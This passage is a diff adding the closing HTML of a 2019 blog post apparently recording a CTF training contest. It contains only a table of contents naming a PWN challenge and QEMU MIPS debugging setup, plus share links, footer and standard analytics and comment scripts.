+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN1"><span class="toc-number">2.</span> <span class="toc-text">PWN1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-QEMU-MIPS调试环境搭建"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 QEMU MIPS调试环境搭建</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/01/19/训练赛记录/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&text=训练赛记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&is_video=false&description=训练赛记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=训练赛记录&body=Check out this article: http://1nv0k3r.me/2019/01/19/训练赛记录/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&title=训练赛记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/01/19/训练赛记录/&name=训练赛记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 1nv0k3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-131778492-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?da32760b25f029bfe0c4abfc646f5f7a";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = '1nv0k3r';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
